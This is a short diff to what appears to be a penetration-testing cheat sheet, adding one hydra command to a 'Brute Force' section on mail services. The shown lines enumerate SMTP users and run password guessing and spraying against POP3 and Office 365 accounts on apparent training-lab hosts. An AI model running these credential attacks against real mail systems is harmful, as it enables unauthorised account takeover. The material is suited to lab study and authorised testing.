@@ -73,6 +73,7 @@ QUIT
 # Brute Force
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+hydra -l "marlin@inlanefreight.htb" -P passwords.list -f inlanefreight.htb pop3   
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 
 # Cloud Enumeration
